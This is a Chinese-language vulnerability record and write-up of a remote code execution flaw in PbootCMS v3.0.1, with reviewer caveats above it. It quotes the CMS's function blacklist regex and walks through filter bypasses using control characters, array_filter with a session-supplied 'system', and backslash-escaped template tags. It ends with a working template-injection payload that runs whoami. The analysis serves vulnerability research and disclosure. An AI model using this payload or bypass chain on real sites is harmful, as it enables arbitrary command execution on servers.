---
source: "hatch 补库批 20260928"
product: "PbootCMS3.0.1"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PbootCMS v3.0.1 远程代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：后台站点信息写入，PbootSystem/sessionID可设system，PHPcontrol-char调用解析/array_filter可用"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-bae3feabf5881ad77d09bb9e"
entity_id: "ve-bae3feabf5881ad77d09bb9e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台站点信息写入，PbootSystem/sessionID可设system，PHPcontrol-char调用解析/array_filter可用

- **结论使用边界（1）**：payload&lt;0x01&gt;是占位不是实际控制字节，应显式解释替换，不能直接复制。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：绕冒号替换的例子正文丢反斜杠但最终payload保留；session_start/session_id调用状态需说明。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：后台权限与图片/代码运行PHP版本遗漏；较2.0.9新增getallheaders黑名单及替代session链是互补不是同文。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PbootCMS v3.0.1 远程代码执行漏洞

一、漏洞简介
------------

二、漏洞影响
------------

PbootCMS v3.0.1

三、复现过程
------------

### 漏洞分析

依然是先查看`apps\home\controller\ParserController.php中的parserIfLabel`方法的两个if标签的过滤项

    if (preg_match_all('/([\w]+)([\/\*\<\>\%\w\s\\\\]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if (function_exists($value) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)/i', $matches[1][$i]))

关于第一处的判断，我们依然可以使用在函数名和括号之间插入控制字符的方法来绕过该处校验，对于第二处，可以看到在黑名单中相较于上个分析版本（2.0.9）添加了getallheaders的黑名单判断，于是该处我们需要寻找新的方法来实现代码执行的目的，这让我想到了array\_filter函数

![1.png](./.resource/PbootCMSv3.0.1远程代码执行漏洞/media/rId25.png)

通过该函数我们可以实现执行php代码，例如array\_filter(\[\'whoami\'\],\'system\');

那么接下来我们需要思考如何绕过黑名单中对system的检测，在这里我们依然可以将system放到header头中，这里可以使用session\_id(session\_start())的方法来取到session的值，我们可以将session的值置为system，就可以成功的调用system函数来执行命令了，通过上面的思路写出利用payload使用的时候却发生了如下问题

![2.png](./.resource/PbootCMSv3.0.1远程代码执行漏洞/media/rId26.png)

该处的冒号被替换成了`@`符号，通过查看github更新记录可以发现如下代码段

![3.png](./.resource/PbootCMSv3.0.1远程代码执行漏洞/media/rId27.png)

该处使用了正则来替换我们输入的if标签，为了绕过该处正则的替换我们可以使用反斜杠来进行绕过，例如{pboot:if}{/pboot:if}，该处的反斜杠会被写入数据库，而在程序调用该段数据并渲染到前台的模板时会调用到stripcslashes函数，进而删除反斜杠，代码位于core\\function\\handle.php中，如图

![4.png](./.resource/PbootCMSv3.0.1远程代码执行漏洞/media/rId28.png)

### 漏洞复现

通过上面的分析，我们易得如下payload

    {pboot\:if(var_dump<0x01>(array_filter<0x01>(['whoami'],session_id<0x01>(session_start<0x01>()))))}bbbbb{/pboot\:if}

来到后台站点信息处

![5.png](./.resource/PbootCMSv3.0.1远程代码执行漏洞/media/rId30.png)

插入上述poc并保存，然后来到前台首页，访问前台首页抓取数据包，将cookie中session的配置项改为system,如图

![6.png](./.resource/PbootCMSv3.0.1远程代码执行漏洞/media/rId31.png)

可以看到成功执行了`system("whoami");`

参考链接
--------

> https://xz.aliyun.com/t/8321
